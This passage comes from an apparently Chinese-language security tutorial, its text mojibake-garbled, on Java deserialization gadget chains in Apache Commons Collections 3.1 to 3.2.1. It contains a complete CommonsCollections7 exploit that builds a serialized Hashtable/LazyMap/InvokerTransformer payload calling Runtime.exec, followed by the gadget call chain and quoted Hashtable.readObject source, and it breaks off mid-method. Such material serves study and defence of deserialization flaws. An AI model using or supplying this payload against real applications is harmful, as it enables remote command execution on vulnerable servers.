</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>object</span><span class=p>;</span><span class=c1>//1</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>å› ä¸º<code>Transformer Testtransformer = new ChainedTransformer(new Transformer[]{})</code>â€‹ï¼Œæ‰€ä»¥æ³¨é‡Š1å¤„è¿”å›cc6ã€‚</p><p>å› æ­¤lazyMapæœ‰ä¸€ä¸ªé”®å€¼å¯¹"cc6"->&ldquo;cc6&rdquo;ã€‚</p><h4 id=testtransformer>Testtransformer</h4><p>Qï¼š</p><p>ä¸ºä½•è¦å…ˆç”¨<code>Testtransformer</code>â€‹æ„é€ ï¼Œå†ç”¨åå°„æ›´æ”¹<code>iTransformers</code>â€‹ã€‚</p><p>Aï¼š</p><p>å¦åˆ™ä¼šåœ¨ååºåˆ—åŒ–ä¹‹å‰è§¦å‘payloadï¼Œå¯¼è‡´ç¨‹åºä¸­æ­¢ã€‚</p><h2 id=commonscollections7>CommonsCollections7</h2><h3 id=ç‰ˆæœ¬é€‚ç”¨èŒƒå›´-6>ç‰ˆæœ¬é€‚ç”¨èŒƒå›´</h3><p>commons-collections : 3.1ï½3.2.1</p><h3 id=expå±•ç¤º-7>Expå±•ç¤º</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.Transformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.functors.ChainedTransformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.functors.ConstantTransformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.functors.InvokerTransformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.keyvalue.TiedMapEntry</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.map.LazyMap</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.io.*</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Field</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.util.HashMap</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.util.Hashtable</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.util.Map</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>CommonsCollections7</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>NoSuchFieldException</span><span class=p>,</span><span class=w> </span><span class=n>IllegalAccessException</span><span class=p>,</span><span class=w> </span><span class=n>IOException</span><span class=p>,</span><span class=w> </span><span class=n>ClassNotFoundException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Transformer</span><span class=w> </span><span class=n>chainedTransformer</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ChainedTransformer</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>Transformer</span><span class=o>[]</span><span class=p>{});</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Transformer</span><span class=o>[]</span><span class=w> </span><span class=n>transformers</span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=n>Transformer</span><span class=o>[]</span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>ConstantTransformer</span><span class=p>(</span><span class=n>Runtime</span><span class=p>.</span><span class=na>class</span><span class=p>),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>InvokerTransformer</span><span class=p>(</span><span class=s>&#34;getMethod&#34;</span><span class=p>,</span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=p>{</span><span class=n>String</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=n>Class</span><span class=o>[]</span><span class=p>.</span><span class=na>class</span><span class=p>},</span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=p>{</span><span class=s>&#34;getRuntime&#34;</span><span class=p>,</span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=p>{}}),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>InvokerTransformer</span><span class=p>(</span><span class=s>&#34;invoke&#34;</span><span class=p>,</span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=p>{</span><span class=n>Object</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=n>Object</span><span class=o>[]</span><span class=p>.</span><span class=na>class</span><span class=p>},</span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=p>{</span><span class=kc>null</span><span class=p>,</span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=p>{}}),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>InvokerTransformer</span><span class=p>(</span><span class=s>&#34;exec&#34;</span><span class=p>,</span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=p>{</span><span class=n>String</span><span class=p>.</span><span class=na>class</span><span class=p>},</span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=p>{</span><span class=s>&#34;calc&#34;</span><span class=p>})</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Map</span><span class=w> </span><span class=n>map</span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=n>HashMap</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Map</span><span class=w> </span><span class=n>lazyMap</span><span class=o>=</span><span class=n>LazyMap</span><span class=p>.</span><span class=na>decorate</span><span class=p>(</span><span class=n>map</span><span class=p>,</span><span class=n>chainedTransformer</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>TiedMapEntry</span><span class=w> </span><span class=n>tiedMapEntry</span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=n>TiedMapEntry</span><span class=p>(</span><span class=n>lazyMap</span><span class=p>,</span><span class=s>&#34;cc7&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Hashtable</span><span class=w> </span><span class=n>hashtable</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Hashtable</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>hashtable</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=n>tiedMapEntry</span><span class=p>,</span><span class=w> </span><span class=s>&#34;cc7&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>lazyMap</span><span class=p>.</span><span class=na>remove</span><span class=p>(</span><span class=s>&#34;cc7&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Field</span><span class=w> </span><span class=n>iTransformers</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ChainedTransformer</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;iTransformers&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>iTransformers</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>iTransformers</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>chainedTransformer</span><span class=p>,</span><span class=n>transformers</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ObjectOutputStream</span><span class=w> </span><span class=n>objectOutputStream</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ObjectOutputStream</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>FileOutputStream</span><span class=p>(</span><span class=s>&#34;cc7.out&#34;</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>objectOutputStream</span><span class=p>.</span><span class=na>writeObject</span><span class=p>(</span><span class=n>hashtable</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>objectOutputStream</span><span class=p>.</span><span class=na>close</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ObjectInputStream</span><span class=w> </span><span class=n>objectInputStream</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ObjectInputStream</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>FileInputStream</span><span class=p>(</span><span class=s>&#34;cc7.out&#34;</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>objectInputStream</span><span class=p>.</span><span class=na>readObject</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h3 id=expæ„é€ åˆ†æ-8>Expæ„é€ åˆ†æ</h3><h4 id=åˆ©ç”¨é“¾å±•ç¤º-6>åˆ©ç”¨é“¾å±•ç¤º</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>Hashtable</span><span class=p>.</span><span class=na>readObject</span><span class=p>()</span><span class=o>/</span><span class=n>Hashtable</span><span class=p>.</span><span class=na>reconstitutionPut</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>TiedMapEntry</span><span class=p>.</span><span class=na>hashCode</span><span class=p>()</span><span class=o>/</span><span class=n>TiedMapEntry</span><span class=p>.</span><span class=na>getValue</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>LazyMap</span><span class=p>.</span><span class=na>get</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>           </span><span class=n>ChainedTransformer</span><span class=p>.</span><span class=na>transform</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>               </span><span class=n>InvokerTransformer</span><span class=p>.</span><span class=na>transform</span><span class=p>()</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h4 id=hashtable>Hashtable</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>reconstitutionPut</span><span class=p>(</span><span class=n>Entry</span><span class=o>&lt;?</span><span class=p>,</span><span class=o>?&gt;[]</span><span class=w> </span><span class=n>tab</span><span class=p>,</span><span class=w> </span><span class=n>K</span><span class=w> </span><span class=n>key</span><span class=p>,</span><span class=w> </span><span class=n>V</span><span class=w> </span><span class=n>value</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>throws</span><span class=w> </span><span class=n>StreamCorruptedException</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>value</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>StreamCorruptedException</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// Makes sure the key is not already in the hashtable.</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// This should not happen in deserialized version.</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>hash</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>key</span><span class=p>.</span><span class=na>hashCode</span><span class=p>();</span><span class=c1>//2</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>index</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>hash</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=n>0x7FFFFFFF</span><span class=p>)</span><span class=w> </span><span class=o>%</span><span class=w> </span><span class=n>tab</span><span class=p>.</span><span class=na>length</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=n>Entry</span><span class=o>&lt;?</span><span class=p>,</span><span class=o>?&gt;</span><span class=w> </span><span class=n>e</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>tab</span><span class=o>[</span><span class=n>index</span><span class=o>]</span><span class=w> </span><span class=p>;</span><span class=w> </span><span class=n>e</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=w> </span><span class=p>;</span><span class=w> </span><span class=n>e</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>e</span><span class=p>.</span><span class=na>next</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>((</span><span class=n>e</span><span class=p>.</span><span class=na>hash</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>hash</span><span class=p>)</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=n>e</span><span class=p>.</span><span class=na>key</span><span class=p>.</span><span class=na>equals</span><span class=p>(</span><span class=n>key</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>StreamCorruptedException</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// Creates the new entry.</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=nd>@SuppressWarnings</span><span class=p>(</span><span class=s>&#34;unchecked&#34;</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Entry</span><span class=o>&lt;</span><span class=n>K</span><span class=p>,</span><span class=n>V</span><span class=o>&gt;</span><span class=w> </span><span class=n>e</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>Entry</span><span class=o>&lt;</span><span class=n>K</span><span class=p>,</span><span class=n>V</span><span class=o>&gt;</span><span class=p>)</span><span class=n>tab</span><span class=o>[</span><span class=n>index</span><span class=o>]</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>tab</span><span class=o>[</span><span class=n>index</span><span class=o>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Entry</span><span class=o>&lt;&gt;</span><span class=p>(</span><span class=n>hash</span><span class=p>,</span><span class=w> </span><span class=n>key</span><span class=p>,</span><span class=w> </span><span class=n>value</span><span class=p>,</span><span class=w> </span><span class=n>e</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>count</span><span class=o>++</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>readObject</span><span class=p>(</span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>ObjectInputStream</span><span class=w> </span><span class=n>s</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>         </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=p>,</span><span class=w> </span><span class=n>ClassNotFoundException</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// Read in the threshold and loadFactor</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>s</span><span class=p>.</span><span class=na>defaultReadObject</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// Validate loadFactor (ignore threshold - it will be re-computed)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>loadFactor</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=n>0</span><span class=w> </span><span class=o>||</span><span class=w> </span><span class=n>Float</span><span class=p>.</span><span class=na>isNaN</span><span class=p>(</span><span class=n>loadFactor</span><span class=p>))</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>StreamCorruptedException</span><span class=p>(</span><span class=s>&#34;Illegal Load: &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>loadFactor</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// Read the original length of the array and number of elements</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>origlength</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>s</span><span class=p>.</span><span class=na>readInt</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>elements</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>s</span><span class=p>.</span><span class=na>readInt</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// Validate # of elements</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>elements</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>StreamCorruptedException</span><span class=p>(</span><span class=s>&#34;Illegal # of Elements: &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>elements</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// Clamp original length to be more than elements / loadFactor</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// (this is the invariant enforced with auto-growth)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>origlength</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Math</span><span class=p>.</span><span class=na>max</span><span class=p>(</span><span class=n>origlength</span><span class=p>,</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=p>)(</span><span class=n>elements</span><span class=w> </span><span class=o>/</span><span class=w> </span><span class=n>loadFactor</span><span class=p>)</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>1</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// Compute new length with a bit of room 5% + 3 to grow but</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// no larger than the clamped original length.  Make the length</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// odd if it&#39;s large enough, this helps distribute the entries.</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// Guard against the length ending up zero, that&#39;s not valid.</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>length</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=p>)((</span><span class=n>elements</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>elements</span><span class=w> </span><span class=o>/</span><span class=w> </span><span class=n>20</span><span class=p>)</span><span class=w> </span><span class=o>/</span><span class=w> </span><span class=n>loadFactor</span><span class=p>)</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>3</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>length</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=n>elements</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=p>(</span><span class=n>length</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=n>1</span><span class=p>)</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>length</span><span class=o>--</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>length</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Math</span><span class=p>.</span><span class=na>min</span><span class=p>(</span><span class=n>length</span><span class=p>,</span><span class=w> </span><span class=n>origlength</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>length</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=c1>// overflow</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>length</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>origlength</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// Check Map.Entry[].class since it&#39;s the nearest public type to</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// what we&#39;re actually creating.</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>SharedSecrets</span><span class=p>.</span><span class=na>getJavaOISAccess</span><span class=p>().</span><span class=na>checkArray</span><span class=p>(</span><span class=n>s</span><span class=p>,</span><span class=w> </span><span class=n>Map</span><span class=p>.</span><span class=na>Entry</span><span class=o>[]</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=n>length</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>table</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Entry</span><span class=o>&lt;?</span><span class=p>,</span><span class=o>?&gt;[</span><span class=n>length</span><span class=o>]</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>threshold</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=p>)</span><span class=n>Math</span><span class=p>.</span><span class=na>min</span><span class=p>(</span><span class=n>length</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>loadFactor</span><span class=p>,</span><span class=w> </span><span class=n>MAX_ARRAY_SIZE</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>1</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>count</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// Read the number of elements and then all the key/value objects</span><span class=w>
